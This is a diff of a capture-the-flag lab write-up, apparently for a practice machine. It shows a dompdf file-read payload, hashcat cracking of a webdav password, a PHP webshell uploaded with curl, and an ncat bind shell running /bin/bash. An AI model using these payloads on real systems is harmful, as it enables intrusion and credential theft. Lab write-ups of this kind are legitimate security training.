@@ -195,18 +195,18 @@ The configuration file reveals the location of a webdav directory and password f
 
 With the possible location of the webdav directory and webdav password, we can try and upload a webshell onto the target system. First we use the Arbitrary File Read exploit and read the webdav_test_inception/webdav.passwd file.
 
-1. Using the following payload to download the webdav.passwd file in pdf format, saved as webdav-passwd.pdf
+Using the following payload to download the webdav.passwd file in pdf format, saved as webdav-passwd.pdf
 ```
 http://10.129.1.104/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd
 ```
 
-2. Again, running the strings command against the downloaded pdf file and then decoding the base64 string. Finally  saving the output to hash.txt.
+Again, running the strings command against the downloaded pdf file and then decoding the base64 string. Finally  saving the output to hash.txt.
 
 ![image](webdav-decoded-passwd.png)
 
 ### Cracking the password
 
-3. Crack the password with hashcat. First we must edit the hash.txt file and remove 'webdav_tester:'. Running the following hashcat command we crach the webdav password.
+Crack the password with hashcat. First we must edit the hash.txt file and remove 'webdav_tester:'. Running the following hashcat command we crach the webdav password.
 
 ```
 hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
@@ -219,18 +219,18 @@ $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69
 
 ### Uploading a webshell to the target
 
-1. We will create a webshell in a file named shell.php
+We will create a webshell in a file named shell.php
 
 ```
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
-2. Use curl to uploaded to the target, using the username and password from webdav.passwd
+Use curl to uploaded to the target, using the username and password from webdav.passwd
 
 ```
 curl -T 'shell.php' --basic --user 'webdav_tester:babygurl69' 'http://10.129.1.104/webdav_test_inception/'
 ```
-3. Confirm the shell was uploaded and command execution if succesful with the following curl command.
+Confirm the shell was uploaded and command execution if succesful with the following curl command.
 
 ```
 curl -u webdav_tester:babygurl69 'http://10.129.1.104/webdav_test_inception/shell.php?cmd=id'
@@ -242,7 +242,7 @@ curl -u webdav_tester:babygurl69 'http://10.129.1.104/webdav_test_inception/shel
 
 After a lot of trying, we are unable to get a reverse shell back to our Kali machine. We are unable to get any kind of connection backk to kali.
 
-### Automate our Remote Code Execution With Python
+## Automate our Remote Code Execution With Python
 
 The following python script runs commands on the target with the curl command used preveously. It uses hURL to url encode the commands. The while loops gives us a feeling of a shell and lets us send commands a little faster.
 
@@ -265,36 +265,38 @@ while True:
         print("Err")
 ```
 
+![image](python-script-confirm.png)
+
 ## Shell As www-data
 
 With our python script we can search a lot of files. We can also run linpea.sh from it, to speed up the process. 
 
 ### Uploading NC to the target ANd Getting A reverse Shell
 
-1. Using the webdave exploit we can upload the nc version on Kali. First we copy the nc binary to our current directory.
+Using the webdave exploit we can upload the nc version on Kali. First we copy the nc binary to our current directory.
 
 ```
 cp /usr/bin/nc .
 ```
 
-2. Then we can upload the file to the /webdav_test_inception/ directory on the target machine, using the curl command.
+Then we can upload the file to the /webdav_test_inception/ directory on the target machine, using the curl command.
 
 ```
 curl -T 'ncat' --basic --user 'webdav_tester:babygurl69' 'http://10.129.1.104/webdav_test_inception/'
 ```
 
-3. Confirm the nc file with out python script.
+Confirm the nc file with out python script.
 
 ![image](ncat-upload.png)
 
-4. First we chmod the permissions on the ncat binary. After a little testing, we setup a listener on port 1234. With our python script, we run the following command on the target.
+First we chmod the permissions on the ncat binary. After a little testing, we setup a listener on port 1234. With our python script, we run the following command on the target.
 
 ```
 chmod 777 ncat
 ./ncat -nvlp 1234 -e /bin/bash
 ```
 
-5. From our Kali machine, we use proxychains and connect to the listener on port 1234.
+From our Kali machine, we use proxychains and connect to the listener on port 1234.
 
 ```
 proxychains nc -nv 127.0.0.1 1234
@@ -302,7 +304,7 @@ proxychains nc -nv 127.0.0.1 1234
 
 ![image](revshell.png)
 
-6. We upgrade our shell and continue our search.
+We upgrade our shell and continue our search.
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
